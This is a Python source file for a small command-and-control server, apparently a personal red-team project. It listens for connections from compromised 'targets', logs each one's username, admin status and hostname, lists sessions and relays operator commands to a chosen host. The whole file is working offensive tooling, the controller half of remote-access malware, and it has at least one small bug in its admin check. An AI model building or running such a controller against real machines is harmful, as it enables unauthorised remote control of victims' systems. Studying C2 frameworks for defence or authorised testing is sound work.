import socket
import argparse
import threading
from prettytable import PrettyTable
import time 
from datetime import datetime


def banner():
    print('╔═╗┬─┐┬┌┬┐┬ ┬┌─┐  ╔═╗2')
    print('╠═╝├┬┘│││││ │└─┐  ║  By Oliver Albertsen')
    print('╩  ┴└─┴┴ ┴└─┘└─┘  ╚═╝')

parser = argparse.ArgumentParser(description='C2 server ')
parser.add_argument('-ip', type=str, required=False, help='Input the listening IP ')
parser.add_argument('-p', type=int, required=False, help='Input the listening port ')

args = parser.parse_args()



def listener_handler(): # Function to handle incoming connections and send bytes over the socket
    sock.bind((host_ip, host_port))
    print('[+] Awaiting connection from client...')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

def comm_in(target_id):
    print(f'[+] Awaiting response...')
    response = target_id.recv(1024).decode()
    return response

def comm_out(target_id, message):
    message = str(message)
    target_id.send(message.encode())

def target_comm(target_id):
    while True:
        message = input('Send message#> ')
        comm_out(target_id, message)
        if message == 'exit':
            target_id.send(message.encode())
            target_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(target_id)
            if response == 'exit':
                print('[-] The client has terminated the session')
                target_id.close()
                break
            print(response)

def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            admin = remote_target.recv(1024).decode()
            if admin == 1:
                admin_value = 'Yes'
            else:
                admin_value = 'No'
            cur_time = time.strftime("%H:%M:%S",time.localtime())
            date = datetime.now()
            time_record = (f'{date.day}/{date.month}/{date.year} {cur_time}')
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value]) #Appending info to targets list
                print(f'[+] Connection recieved from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
            else: 
                targets.append([remote_target, remote_ip[0], time_record])
                print(f'[+] Connection recieved from {remote_ip[0]}\n' + 'Enter command#> ', end="")  
        except:
            pass

   
if __name__ == '__main__':
    targets = [] #store each socket connection
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = args.ip
    host_port = args.p
    listener_handler()
    while True:
        try:
            command = input('Enter command#>')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    session_table = PrettyTable()
                    session_table.field_names = ['Session','Username', 'Admin' ,'Status' ,'Target','Check-in Time']
                    session_table.padding_width = 3
                    for target in targets:
                        session_table.add_row([session_counter, target[3],target[4],'Placeholder', target[1], target[2]])
                        session_counter += 1
                    print(session_table)
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    target_id = (targets[num])[0]
                    target_comm(target_id)
        except KeyboardInterrupt:
            print('\n[-] Keyboard interupt iniated by user')
            kill_flag = 1
            sock.close()
            break
